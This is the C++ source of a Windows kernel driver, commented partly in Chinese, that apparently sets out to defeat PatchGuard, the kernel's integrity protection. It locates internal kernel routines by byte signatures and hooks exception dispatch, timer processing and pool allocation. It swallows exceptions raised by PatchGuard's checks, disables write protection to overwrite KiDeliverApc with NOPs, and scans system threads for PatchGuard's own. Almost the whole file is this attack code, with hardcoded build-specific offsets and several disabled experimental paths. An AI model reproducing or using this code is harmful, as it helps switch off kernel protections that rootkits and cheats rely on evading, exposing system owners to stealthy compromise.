#include"pg.h"
#include"Utilities.h"
#include"khook/hk.h"
#include"NtApi.h"
#include"import.h"

void* stack[100];
KAPC stackApc;
KSPIN_LOCK stackLock;
KEVENT stackEvent;
PETHREAD pgThread;
KAPC sleepApc;

extern "C" uintptr_t GetKernelBase();

vector<void*> *probablyPgThread;

void BypassStart()
{
	InitKernelBase();
	FindAccessRoutine();
    InitAllFuncPointers();
	ExcuteHook();
	AttackSystemThread();
	ScanBigPool();
}
void InitKernelBase()
{
	gKernelBase = GetKernelBase();
}

/// <summary>
/// 找到所有的KiCustomRecurseRoutineX例程
/// </summary>
void FindAccessRoutine()
{
	gAccessRoutine = new vector<void*>;
	probablyPgThread = new vector<void*>;
	probablyPgThread->resize(100);
	gAccessRoutine->resize(10);

	KeInitializeSpinLock(&stackLock);
	KeInitializeEvent(&stackEvent, SynchronizationEvent, false);

	auto pKeSetPriorityThread = Utils::GetExportFunc(L"KeSetPriorityThread");
	while (1)
	{
		ULONG_PTR KiCustomRecurseRoutinex = Utils::FindPattern(
			pKeSetPriorityThread,
			"48 83 EC 28 FF C9 74 05",
			0x100000);
		pKeSetPriorityThread = KiCustomRecurseRoutinex + 1;
		gAccessRoutine->push_back((void*)KiCustomRecurseRoutinex);
		if (gAccessRoutine->size() == 10)
			break;
	}
}

void InitAllFuncPointers()
{
	ULONG_PTR pKeReadStateSemaphore = Utils::GetExportFunc(L"KeReadStateSemaphore");
	OriginKiDispatchException = (KiDispatchException_t)Utils::FindPattern(
		pKeReadStateSemaphore,
		"40 55 ?? ?? ?? ?? ?? ?? ?? ?? 48 81 EC 78 01",
		0x10000);
	SystemKiDispatchException = OriginKiDispatchException;

	auto pZwCreateTimer = Utils::GetExportFunc(L"ZwCreateTimer");
	IdleLoopThread = (PVOID)Utils::FindPattern(
		pZwCreateTimer,
		"48 83 EC 28 48 83 64 24 28 00",
		0x10000);
	Log("[INFO]IdleLoopThread = %p\n", IdleLoopThread);

	auto pExQueueWorkItem = Utils::GetExportFunc(L"ExQueueWorkItem");
	SystemKiProcessExpiredTimerList = (PVOID)Utils::FindPattern(
		pExQueueWorkItem,
		"8D 43 01 83 E3 0F 41 89 04 24",
		0x10000);

	Log("[INFO]SystemKiProcessExpiredTimerList = %p\n", SystemKiProcessExpiredTimerList);


	auto pPsGetCurrentSilo = Utils::GetExportFunc(L"PsGetCurrentSilo");
	SystemKiDeliverApc = (PVOID)Utils::FindPattern(
		pPsGetCurrentSilo,
		"48 89 54 24 10 88 4C 24 08 55 53 41 54 41 56 41 57",
		0x10000);
	Log("[INFO]SystemKiDeliverApc = %p\n", SystemKiDeliverApc);

	SystemExAllocatePoolWithTag = (PVOID)Utils::GetExportFunc(L"ExAllocatePoolWithTag");
}

void ExcuteHook()
{
	HkDetourFunction(SystemKiDispatchException, DetourKiDispatchException, (PVOID*)&OriginKiDispatchException);
	HkDetourFunction(SystemKiProcessExpiredTimerList, 
		DetourKiProcessExpiredTimerList, 
		(PVOID*)&OriginKiProcessExpiredTimerList);
	HkDetourFunction(SystemExAllocatePoolWithTag,
		DetourExAllocatePoolWithTag,
		(PVOID*)&OriginExAllocatePoolWithTag);
}

void RestoreHook()
{
	HkRestoreFunction(SystemKiDispatchException, OriginKiDispatchException);

}

/*
.text:FFFFF8061EBD34ED 8B 02                          mov     eax, [rdx]
.text:FFFFF8061EBD34EF 48 83 C4 28                    add     rsp, 28h
*/

VOID(__fastcall DetourKiDispatchException)(
	IN PEXCEPTION_RECORD ExceptionRecord,
	IN PKEXCEPTION_FRAME ExceptionFrame,
	IN PKTRAP_FRAME TrapFrame,
	IN KPROCESSOR_MODE PreviousMode,
	IN BOOLEAN FirstChance
	)
{
#if 1 
	//由KiCustomRecurseRoutineX解引用DefferContext造成的异常
	for (auto addr : *gAccessRoutine)
	{
		if (ExceptionRecord->ExceptionAddress > addr &&
			ExceptionRecord->ExceptionAddress < (void*)((ULONG_PTR)addr + 0x13))
		{
#if 1 
			/*
[CONTEXT]
Rip = FFFFF8027127172D
Rbx = EEB3E3E281C0E378
Rdx = EEB3E3E281C0E378	
			*/
			Log("[CONTEXT]\nRip = %p\nRbx = %p\nRdx = %p\n", TrapFrame->Rip, TrapFrame->Rdx, ExceptionFrame->Rbx);
#endif

#if 1
			TrapFrame->Rip += 2;
			//TrapFrame->Rdx = (ULONG64)dummy;
#endif

			return;
		}
	}
#endif
	/*+++
	如果当前线程是idelloop，然后出异常，我们就给他恢复不正常的寄存器
	。系统会卡死
	---*/
#if 0
	auto currentThread = KeGetCurrentThread();
	if (*(PVOID*)((ULONG_PTR)currentThread + 0x690) == IdleLoopThread) {
		TrapFrame->Rdx = (ULONG64)dummy;
		ExceptionFrame->Rbx = (ULONG64)dummy;
		Log("[INFO]IdleLoopEnter!\n");
		return;
	}
#endif


	
#if 0
	//.text:FFFFF8055407C00A                 cmp     [rbx], edi  IopTimerDispatch解引用异常的一个分支
	if (ExceptionRecord->ExceptionAddress == (void*)(gKernelBase + 0x1D100A))
	{
		//这里注意TrapFrame->Rbx不行
		//ExceptionFrame->Rbx = (ULONG64)dummy;//给一个合法的地址让他解引用就可以
		return;
	}
	//-----------------------

	if (ExceptionRecord->ExceptionAddress == (void*)(gKernelBase + 0x32DAC))
	{
		//ExceptionFrame->Rbx = (ULONG64)dummy;
		return;
	}

	if (ExceptionRecord->ExceptionAddress == (void*)(gKernelBase + 0x265A28))
	{
		//ExceptionFrame->Rbx = (ULONG64)dummy;
		return;
	}
#endif


	return OriginKiDispatchException(ExceptionRecord, ExceptionFrame, TrapFrame, PreviousMode, FirstChance);
}

bool DpcHandler(KDPC* Dpc)
{
	if ((((ULONG_PTR)Dpc->DeferredContext & 0xffff000000000000) != 0xffff000000000000) && Dpc->DeferredContext != 0) {
		//PatchGuard
		Log("[INFO]DefferContext %p\n", Dpc->DeferredContext);
		return true;
	}
	return false;
}

VOID DummyDpc(
	IN struct _KDPC* Dpc,
	IN PVOID DeferredContext,
	IN PVOID SystemArgument1,
	IN PVOID SystemArgument2
)
{
	Log("[INFO]Dummy Dpc Excute!\n");
}

VOID StackRoutine(
	IN struct _KAPC* Apc,
	IN OUT PKNORMAL_ROUTINE* NormalRoutine OPTIONAL,
	IN OUT PVOID* NormalContext OPTIONAL,
	IN OUT PVOID* SystemArgument1 OPTIONAL,
	IN OUT PVOID* SystemArgument2 OPTIONAL)
{
	static bool findPgThread = false;
	if (findPgThread)
		return;
	//DbgBreakPoint();
	memset(stack, 0, sizeof(stack));
	RtlWalkFrameChain(stack, 10, 0);
	//Log("[FRAMEWALK-START]\n");
	//for (int i = 0; i < 10; i++)
		//Log("%p\n", stack[i]);
	//Log("[FRAMEWALK-END]\n");
	
	__try
	{
		//Log("[INFO]%x\n", *(DWORD*)((DWORD*)stack[5]));
		for (int i = 0; (i < 10); i++) {
			if (MmIsAddressValid(stack[i]))
			{
				if (*(DWORD*)((DWORD*)stack[i] + 0) == 0x45d23345)
				{
					Log("find pg thread %p\n",KeGetCurrentThread());
					findPgThread = true;
					KeSetEvent(&stackEvent, 0, 0);
					memset(stack, 0, sizeof(stack));
					pgThread = KeGetCurrentThread();
					//KeWaitForSingleObject(IoGetCurrentProcess(), Executive, KernelMode, 0, NULL);
				}
			}
		}
	}
	__except (1)
	{
		Log("[WARNING]StackWalker Exception\n");
		KeSetEvent(&stackEvent, 0, 0);
		return;
	}
	KeSetEvent(&stackEvent, 0, 0);
	return;
}
VOID SleepRoutine(
	IN struct _KAPC* Apc,
	IN OUT PKNORMAL_ROUTINE* NormalRoutine OPTIONAL,
	IN OUT PVOID* NormalContext OPTIONAL,
	IN OUT PVOID* SystemArgument1 OPTIONAL,
	IN OUT PVOID* SystemArgument2 OPTIONAL)
{
	LARGE_INTEGER time;
	KeWaitForSingleObject(IoGetCurrentProcess(), Executive, KernelMode, 0, NULL);
}
NTSTATUS ScanBigPool()
{



	PSYSTEM_BIGPOOL_INFORMATION pBigPoolInfo;
	ULONG64 ReturnLength = 0;
	NTSTATUS status;
	ULONG i = 0;
	int num = 0;


	pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, sizeof(SYSTEM_BIGPOOL_INFORMATION), 'ttt');
	status = ZwQuerySystemInformation(SystemBigPoolInformation/*SystemBigPoolInformation*/, pBigPoolInfo, sizeof(SYSTEM_BIGPOOL_INFORMATION), (ULONG*)&ReturnLength);
	Log("pBigPoolInfo->Count - %d \n", pBigPoolInfo->Count);
	Log("ReturnLength - %p \n", ReturnLength);
	ExFreePool(pBigPoolInfo);
	pBigPoolInfo = (PSYSTEM_BIGPOOL_INFORMATION)ExAllocatePoolWithTag(NonPagedPool, ReturnLength + 0x1000, 'ttt');
	if (!pBigPoolInfo)
		return STATUS_UNSUCCESSFUL;
	status = ZwQuerySystemInformation(SystemBigPoolInformation, pBigPoolInfo, ReturnLength + 0x1000, (ULONG*)&ReturnLength);
	if (status != STATUS_SUCCESS)
	{
		Log("query BigPoolInfo failed: %p\n", status);
		return status;
	}
	Log("pBigPoolInfo: %p\n", pBigPoolInfo);


	for (i = 0; i < pBigPoolInfo->Count; i++)
	{
		PVOID addr = pBigPoolInfo->AllocatedInfo[i].VirtualAddress;
	
		/*
		@需要进一步判断size
		*/
		if (pBigPoolInfo->AllocatedInfo[i].SizeInBytes >= 0x50000)
		{
			//auto pte = GetPTEForVA(pBigPoolInfo->AllocatedInfo[i].VirtualAddress);
			//Log("pool at %p\npool size = %llx\n", pBigPoolInfo->AllocatedInfo[i].VirtualAddress,
			//	pBigPoolInfo->AllocatedInfo[i].SizeInBytes);
			/*if (MmIsAddressValid(pBigPoolInfo->AllocatedInfo[i].VirtualAddress)
				&& MmIsAddressValid(pte) 
				&& !pte->u.Hard.NoExecute 
				&& pte->u.Hard.Write)
			*(char*)pBigPoolInfo->AllocatedInfo[i].VirtualAddress = 0xcc;*/
			//pte->u.Hard.NoExecute = 1;
		}
	}
	ExFreePool(pBigPoolInfo);
	return status;
}

void AttackSystemThread()
{
	auto irql = WPOFFx64();
	char nop[6] = { 0x90,0x90,0x90,0x90,0x90,0x90 };
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x126), nop, sizeof(nop));
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x12f), nop, sizeof(nop));
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x23b), nop, sizeof(nop));
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x244), nop, sizeof(nop));
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x3Fe), nop, sizeof(nop));
	memcpy((PVOID)((ULONG_PTR)SystemKiDeliverApc + 0x407), nop, sizeof(nop));
	WPONx64(irql);

	CLIENT_ID* ThreadId = NULL;
	PEPROCESS pkProcess = NULL;
	PKTHREAD pkThread = NULL;
	PETHREAD pEthread = NULL;
	LIST_ENTRY* pEthreadNext = NULL;
	LIST_ENTRY* pEthreadCurrent = NULL;

	//vector<void*> stack;
	void* stack[100];

	//DbgBreakPoint();

	pkProcess = PsGetCurrentProcess();
	// 获取_KPROCESS->ThreadListHead(_LIST_ENTRY)
	pEthreadCurrent = (LIST_ENTRY*)((ULONG_PTR)pkProcess + 0x30);

	/* 注：

			1. _KPROCESS.ThreadListHead->Flink指向的是一个_KTHREAD.ThreadListEntry
			2. _KTHREAD.ThreadListEntry - 偏移ThreadListEntry获取到KTHREAD地址，其实也就是ETHREAD地址.
	*/

	// 这个 (PETHREAD)(PEPROCESS + 0x2c)
	pEthreadNext = pEthreadCurrent->Flink;

	while (pEthreadCurrent != pEthreadNext)
	{
		pkThread = (PKTHREAD)((ULONG_PTR)pEthreadNext - 0x2f8);

		pEthread = (PETHREAD)pkThread;

		ThreadId = (CLIENT_ID*)((ULONG_PTR)pEthread + 0x638);

		//Log("ThreadId = %d, ProcessId = %d\n\n", ThreadId->UniqueThread, ThreadId->UniqueProcess);

		//DbgBreakPoint();
		//if (pEthread != KeGetCurrentThread()
			//&& (pEthread->u2.Alertable)
			//&& pEthread->u2.SystemThread
			//&& MmIsAddressValid(pEthread)
			//&& ExAcquireRundownProtection((PEX_RUNDOWN_REF)(ULONG_PTR)pEthread + 0x6B8)) {

				//if (*((ULONG_PTR*)(ULONG_PTR)pEthread + 0x690) == 0xFFFFF8030703DF80)
				//	continue;

			//	KeInitializeApc(&stackApc, pEthread, OriginalApcEnvironment, StackRoutine, NULL, NULL, KernelMode, NULL);
				//KeInsertQueueApc(&stackApc, 0, 0, 0);
			//}

		if (!pEthread->Running)
		{
			//Log("[INFO]%p", pEthread);
			//KeInitializeApc(&stackApc, pEthread, OriginalApcEnvironment, StackRoutine, NULL, NULL, KernelMode, NULL);
			//KeInsertQueueApc(&stackApc, 0, 0, 0);
			/*auto v8 = pEthread->ApcState;
			auto v13 = v8.ApcListHead[KernelMode].Flink;
			auto v22 = v13->Flink;
			auto v23 = v13->Blink;*/
			do {
				//if (v13 == (LIST_ENTRY*)&v8)
				//	break;
				//if (v13->Flink->Blink != v13 || v23->Flink != v13)
				//	break;

				if (ThreadId->UniqueThread < (HANDLE)0x50)
					break;

				if (*(char*)((ULONG_PTR)pEthread + 0x233) != 12)
					break;

				Log("[Thread]%p\n", pEthread);
				probablyPgThread->push_back(pEthread);

			} while (0);
		}

		pEthreadNext = pEthreadNext->Flink;
	}

	LARGE_INTEGER time = { -10000 * 1000 * 1 };
	for (auto thread : *probablyPgThread)
	{
		__try {

			if (MmIsAddressValid(thread))
			{
				KeResetEvent(&stackEvent);
				//DbgBreakPoint();

				//KeInitializeApc(&stackApc,
				//	(PETHREAD)thread, OriginalApcEnvironment, StackRoutine, NULL, NULL, KernelMode, NULL);
				//KeInsertQueueApc(&stackApc, 0, 0, 0);
				//if (pgThread) {
				//	KeInitializeApc(&sleepApc, pgThread, OriginalApcEnvironment, SleepRoutine, 0, 0, KernelMode, 0);
				//	//KeWaitForSingleObject(&stackEvent, Executive, KernelMode, true, &time);
				//	KeInsertQueueApc(&sleepApc, 0, 0, 0);
				//	return;
				//}
			}
		}
		__except (1)
		{

		}
	}
	
}

/// <summary>
/// Get page hardware PTE.
/// Address must be valid, otherwise bug check is imminent
/// </summary>
/// <param name="pAddress">Target address</param>
/// <returns>Found PTE</returns>
//0: kd> dq mmptebase
//fffff803`073f4370  ffffea80`00000000 00000000`034df280
PMMPTE GetPTEForVA(IN PVOID pAddress)
{
	//DbgBreakPoint();
	ULONGLONG mask = (1ll << (PHYSICAL_ADDRESS_BITS - 1)) - 1;
	static ULONG_PTR pteBase = Utils::BBGetPte();
	static ULONG_PTR pdeBase = (pteBase & ~mask) | (pteBase >> 9) & mask;
	if (!pteBase)
		return NULL;

		// Check if large page
		PMMPTE pPDE = (PMMPTE)(((((ULONG_PTR)pAddress >> PDI_SHIFT) << PTE_SHIFT) & 0x3FFFFFF8ull) + pdeBase);
		if (MmIsAddressValid(pPDE)) {
			if (pPDE->u.Hard.LargePage)
				return pPDE;
		}
		else
			return NULL;
		return (PMMPTE)(((((ULONG_PTR)pAddress >> PTI_SHIFT) << PTE_SHIFT) & 0x7FFFFFFFF8ull) + pteBase);
	

}

PVOID DetourExAllocatePoolWithTag(
	__drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,
	SIZE_T                                         NumberOfBytes,
	ULONG                                          Tag
)
{
	KAPC sleepApc;
	PVOID r = OriginExAllocatePoolWithTag(PoolType, NumberOfBytes, Tag);
	/*if (((ULONG_PTR)r > (0xFFFF8A8688802000 - 0x2000) && (ULONG_PTR)r < (0xFFFF8A8688802000 + 0x2000)) ||
		((ULONG_PTR)r > (0xFFFF8A8688A02060 - 0x2000) && (ULONG_PTR)r < (0xFFFF8A8688A02060 + 0x2000)
			&& NumberOfBytes > 0x50000)
		) {*/
		//Log("[ExAllocate]%p size = %x\n", r, NumberOfBytes);
		//DbgBreakPoint();
		//auto kthread = KeGetCurrentThread();
		//KeInitializeApc(&sleepApc, kthread, OriginalApcEnvironment, SleepRoutine, 0, 0, KernelMode, 0);
		//KeInsertQueueApc(&sleepApc, 0, 0, 0);
		//KeWaitForSingleObject(IoGetCurrentProcess(), Executive, KernelMode, 0, NULL);
		if(NumberOfBytes > 0x50000){
			Log("[ExAllocate]%p size = %x\n", r, NumberOfBytes);
			Log("[PG]Thread %p\n", KeGetCurrentThread());
			//DbgBreakPoint();
	}
	return r;
}